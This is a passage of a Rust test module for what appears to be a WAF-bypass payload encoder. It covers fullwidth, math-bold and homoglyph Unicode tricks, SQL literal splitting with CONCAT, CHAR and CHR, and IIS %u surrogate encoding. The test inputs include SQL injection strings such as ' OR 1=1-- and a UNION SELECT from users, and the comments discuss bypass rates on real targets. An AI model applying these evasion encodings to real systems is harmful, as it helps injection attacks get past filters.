        // SELECT → 𝐒𝐄𝐋𝐄𝐂𝐓
        let encoded = math_bold_encode("SELECT");
        assert_eq!(encoded.chars().count(), 6);
        for ch in encoded.chars() {
            assert!(
                (0x1D400..=0x1D419).contains(&(ch as u32)),
                "expected math bold capital, got U+{:04X}",
                ch as u32
            );
        }
    }

    #[test]
    fn math_bold_encode_preserves_punctuation() {
        // ' OR 1=1-- — only letters/digits transform; punctuation stays
        let encoded = math_bold_encode("' OR 1=1--");
        // ' space = = - - all unchanged
        assert!(encoded.starts_with('\''));
        assert!(encoded.contains('='));
        assert!(encoded.ends_with("--"));
    }

    #[test]
    fn math_bold_encode_mixed_alphanumeric() {
        let encoded = math_bold_encode("Aa0");
        // A → 𝐀, a → 𝐚, 0 → 𝟎
        let chars: Vec<char> = encoded.chars().collect();
        assert_eq!(chars.len(), 3);
        assert_eq!(chars[0] as u32, 0x1D400);
        assert_eq!(chars[1] as u32, 0x1D41A);
        assert_eq!(chars[2] as u32, 0x1D7CE);
    }

    #[test]
    fn math_bold_encode_distinct_from_fullwidth() {
        // Fullwidth uses U+FF00 block; math bold uses U+1D400 block
        // The same input must produce different bytes (proving they're not equivalent).
        assert_ne!(math_bold_encode("SELECT"), fullwidth_encode("SELECT"));
    }

    #[test]
    fn math_bold_encode_empty() {
        assert_eq!(math_bold_encode(""), "");
    }

    // ── sql_concat_split tests ─────────────────────────────────────────

    #[test]
    fn sql_concat_split_admin() {
        assert_eq!(
            sql_concat_split("'admin'"),
            "CONCAT('a','d','m','i','n')"
        );
    }

    #[test]
    fn sql_concat_split_password() {
        assert_eq!(
            sql_concat_split("'password'"),
            "CONCAT('p','a','s','s','w','o','r','d')"
        );
    }

    #[test]
    fn sql_concat_split_in_clause() {
        assert_eq!(
            sql_concat_split("WHERE u='admin'"),
            "WHERE u=CONCAT('a','d','m','i','n')"
        );
    }

    #[test]
    fn sql_concat_split_no_quotes_passthrough() {
        // No single quotes → input unchanged
        assert_eq!(sql_concat_split("SELECT 1"), "SELECT 1");
    }

    #[test]
    fn sql_concat_split_multiple_literals() {
        // Two separate strings get independent CONCAT calls
        assert_eq!(
            sql_concat_split("'a' OR 'b'"),
            "CONCAT('a') OR CONCAT('b')"
        );
    }

    #[test]
    fn sql_concat_split_empty_literal() {
        assert_eq!(sql_concat_split("''"), "CONCAT('')");
    }

    #[test]
    fn sql_concat_split_unbalanced_quote_passthrough() {
        // Lone opening quote with no closer → output preserves it
        assert_eq!(sql_concat_split("'unclosed"), "'unclosed");
    }

    #[test]
    fn sql_concat_split_preserves_non_quote_chars() {
        // SQL keywords, operators, whitespace all unchanged
        let payload = "1=1; SELECT 'x', 'y' FROM dual";
        let out = sql_concat_split(payload);
        assert!(out.contains("SELECT"));
        assert!(out.contains("FROM dual"));
        assert!(out.contains("CONCAT('x')"));
        assert!(out.contains("CONCAT('y')"));
    }

    #[test]
    fn sql_concat_split_real_injection_payload() {
        // Classic UNION SELECT extraction
        let payload = "' UNION SELECT 'admin','password' FROM users--";
        let out = sql_concat_split(payload);
        // Outer ' is unbalanced; collects up to ' before admin then closes there.
        // The first CONCAT contains the OR/UNION/SELECT keywords as char args —
        // not a useful execution path, but it demonstrates the tamper is
        // applied uniformly. The point is: every single-quoted region becomes
        // CONCAT, so a downstream layer can compose this with other tampers.
        assert!(out.contains("CONCAT("));
        // Real payloads that benefit start the quote OPEN and close it
        // before the SQL keywords, e.g. "1' UNION SELECT 'admin'--" where
        // the embedded 'admin' is the bypass target.
    }

    // ── sql_char_decompose tests ───────────────────────────────────────

    #[test]
    fn sql_char_decompose_admin() {
        // 'a'=97 'd'=100 'm'=109 'i'=105 'n'=110
        assert_eq!(sql_char_decompose("'admin'"), "CHAR(97,100,109,105,110)");
    }

    #[test]
    fn sql_char_decompose_password() {
        assert_eq!(
            sql_char_decompose("'password'"),
            "CHAR(112,97,115,115,119,111,114,100)"
        );
    }

    #[test]
    fn sql_char_decompose_path_literal() {
        // '/etc/passwd' — every byte represented numerically
        // '/'=47 'e'=101 't'=116 'c'=99 '/'=47 'p'=112 'a'=97 's'=115 's'=115 'w'=119 'd'=100
        assert_eq!(
            sql_char_decompose("'/etc/passwd'"),
            "CHAR(47,101,116,99,47,112,97,115,115,119,100)"
        );
    }

    #[test]
    fn sql_char_decompose_no_quotes_passthrough() {
        assert_eq!(sql_char_decompose("SELECT 1"), "SELECT 1");
    }

    #[test]
    fn sql_char_decompose_empty_literal() {
        assert_eq!(sql_char_decompose("''"), "CHAR()");
    }

    #[test]
    fn sql_char_decompose_unbalanced_passthrough() {
        assert_eq!(sql_char_decompose("'unclosed"), "'unclosed");
    }

    #[test]
    fn sql_char_decompose_multiple_literals() {
        // 'a'=97  'b'=98
        assert_eq!(
            sql_char_decompose("'a' OR 'b'"),
            "CHAR(97) OR CHAR(98)"
        );
    }

    #[test]
    fn sql_char_decompose_distinct_from_concat_split() {
        // CONCAT uses single-char strings; CHAR uses ints. Outputs differ.
        assert_ne!(
            sql_char_decompose("'admin'"),
            sql_concat_split("'admin'")
        );
    }

    #[test]
    fn sql_char_decompose_real_injection() {
        let payload = "1 OR username='admin'--";
        let out = sql_char_decompose(payload);
        assert_eq!(
            out,
            "1 OR username=CHAR(97,100,109,105,110)--"
        );
    }

    // ── pg_chr_decompose tests ─────────────────────────────────────────

    #[test]
    fn pg_chr_decompose_admin() {
        assert_eq!(
            pg_chr_decompose("'admin'"),
            "(CHR(97)||CHR(100)||CHR(109)||CHR(105)||CHR(110))"
        );
    }

    #[test]
    fn pg_chr_decompose_empty_literal() {
        assert_eq!(pg_chr_decompose("''"), "('')");
    }

    #[test]
    fn pg_chr_decompose_in_where_clause() {
        assert_eq!(
            pg_chr_decompose("WHERE u='a'"),
            "WHERE u=(CHR(97))"
        );
    }

    #[test]
    fn pg_chr_decompose_distinct_from_char_decompose() {
        // CHR() is unary + pipe-concat; CHAR() is variadic. Different shapes.
        assert_ne!(
            pg_chr_decompose("'admin'"),
            sql_char_decompose("'admin'")
        );
    }

    #[test]
    fn pg_chr_decompose_unbalanced_passthrough() {
        assert_eq!(pg_chr_decompose("'unclosed"), "'unclosed");
    }

    #[test]
    fn sql_concat_split_isolated_literal_keeps_other_tokens() {
        // From a real payload: id=1 AND username = 'admin' AND status = 1
        let payload = "id=1 AND username='admin' AND status=1";
        let out = sql_concat_split(payload);
        assert_eq!(
            out,
            "id=1 AND username=CONCAT('a','d','m','i','n') AND status=1"
        );
    }

    #[test]
    fn unicode_encode_empty() {
        assert_eq!(unicode_encode(""), "");
    }

    // ── Fullwidth encoding tests ───────────────────────────────────────

    #[test]
    fn fullwidth_encode_sql_keywords() {
        let encoded = fullwidth_encode("SELECT");
        assert_eq!(encoded, "ＳＥＬＥＣＴ");
        // Every ASCII letter should be in fullwidth range
        for ch in encoded.chars() {
            assert!(
                ch as u32 >= 0xFF01,
                "expected fullwidth char, got {ch} (U+{:04X})",
                ch as u32
            );
        }
    }

    #[test]
    fn fullwidth_encode_spaces() {
        let encoded = fullwidth_encode("A B");
        assert!(
            encoded.contains('\u{3000}'),
            "space should become ideographic space"
        );
    }

    #[test]
    fn fullwidth_encode_preserves_non_ascii() {
        let encoded = fullwidth_encode("日本語");
        assert_eq!(encoded, "日本語", "non-ASCII should pass through unchanged");
    }

    #[test]
    fn fullwidth_encode_operators() {
        let encoded = fullwidth_encode("1=1");
        assert_eq!(encoded, "１＝１");
    }

    #[test]
    fn fullwidth_encode_sqli_payload() {
        let encoded = fullwidth_encode("' OR 1=1--");
        // Should contain fullwidth equivalents, not ASCII
        assert!(!encoded.contains("OR"), "should not contain ASCII 'OR'");
        assert!(encoded.contains("ＯＲ"), "should contain fullwidth 'ＯＲ'");
    }

    #[test]
    fn fullwidth_encode_empty() {
        assert_eq!(fullwidth_encode(""), "");
    }

    // ── Homoglyph encoding tests ───────────────────────────────────────

    #[test]
    fn homoglyph_replaces_quotes() {
        let encoded = homoglyph_encode("' OR '1'='1");
        assert!(
            !encoded.contains('\''),
            "ASCII single quote should be replaced"
        );
        assert!(
            encoded.contains('\u{2019}'),
            "should contain RIGHT SINGLE QUOTATION MARK"
        );
    }

    #[test]
    fn homoglyph_replaces_angle_brackets() {
        let encoded = homoglyph_encode("<script>");
        assert!(!encoded.contains('<'), "ASCII < should be replaced");
        assert!(!encoded.contains('>'), "ASCII > should be replaced");
        assert!(encoded.contains('\u{FF1C}'), "should contain fullwidth <");
        assert!(encoded.contains('\u{FF1E}'), "should contain fullwidth >");
    }

    #[test]
    fn homoglyph_replaces_equals() {
        let encoded = homoglyph_encode("1=1");
        assert!(!encoded.contains('='), "ASCII = should be replaced");
        assert!(encoded.contains('\u{FF1D}'), "should contain fullwidth =");
    }

    #[test]
    fn homoglyph_preserves_letters() {
        let encoded = homoglyph_encode("SELECT");
        assert_eq!(encoded, "SELECT", "letters should be preserved");
    }

    #[test]
    fn homoglyph_encode_empty() {
        assert_eq!(homoglyph_encode(""), "");
    }

    #[test]
    fn homoglyph_replaces_parens() {
        let encoded = homoglyph_encode("fn()");
        assert!(encoded.contains('\u{FF08}'), "should contain fullwidth (");
        assert!(encoded.contains('\u{FF09}'), "should contain fullwidth )");
    }

    // ── Bug 2 regression: iis_unicode_encode non-BMP adversarial twins ──
    //
    // PRE-FIX BUG: the loop body cast `ch as u32` into a %uXXXX format
    // without checking whether `code > 0xFFFF`. For supplementary-plane
    // characters (U+10000 and above) this produced a 5-digit hex sequence
    // like `%u1F600`, which IIS's %u decoder rejects (its format is
    // strictly 4 hex digits). The bypass looked encoded but was actually
    // undecodable on any real IIS target — a silent bypass-rate killer.
    // Fixed: emit a UTF-16 surrogate pair `%uHIGH%uLOW` for non-BMP chars.

    #[test]
    fn iis_unicode_encode_lowest_non_bmp_u10000() {
        // U+10000 is the very first supplementary-plane codepoint (LINEAR B
        // SYLLABLE B008 A). Pre-fix: emitted `%u10000` (5 hex digits —
        // invalid IIS format). Post-fix: must emit the surrogate pair
        // %uD800%uDC00 (high=0xD800, low=0xDC00 for U+10000).
        let ch = '\u{10000}'; // U+10000
        let encoded = iis_unicode_encode(&ch.to_string());
        assert_eq!(
            encoded, "%uD800%uDC00",
            "U+10000 (lowest non-BMP) must encode as surrogate pair %uD800%uDC00, \
             not the invalid %u10000"
        );
        // Anti-regression: no 5-digit %u sequence.
        for hex_run in encoded.split("%u").skip(1) {
            let hex_part: String =
                hex_run.chars().take_while(|c| c.is_ascii_hexdigit()).collect();
            assert_eq!(
                hex_part.len(),
                4,
                "every %u sequence must be exactly 4 hex digits (IIS spec); \
                 got {hex_part:?} in {encoded:?}"
            );
        }
    }

    #[test]
    fn iis_unicode_encode_high_cjk_supplement_u20000() {
        // U+20000 is the first codepoint in CJK Unified Ideographs Extension
        // B (𠀀). Pre-fix: emitted `%u20000` (5 hex digits — IIS rejects).
        // Post-fix: surrogate pair calculation:
        //   surrogate_base = 0x20000 - 0x10000 = 0x10000
        //   high = 0xD800 + (0x10000 >> 10) = 0xD800 + 0x40 = 0xD840
        //   low  = 0xDC00 + (0x10000 & 0x3FF) = 0xDC00 + 0x00 = 0xDC00
        let ch = '\u{20000}';
        let encoded = iis_unicode_encode(&ch.to_string());
        assert_eq!(
            encoded, "%uD840%uDC00",
            "U+20000 (CJK Supplement) must encode as %uD840%uDC00"
        );
        for hex_run in encoded.split("%u").skip(1) {
            let hex_part: String =
                hex_run.chars().take_while(|c| c.is_ascii_hexdigit()).collect();
            assert_eq!(
                hex_part.len(),
                4,
                "each %u group must be 4 hex digits; got {hex_part:?}"
            );
        }
    }
}
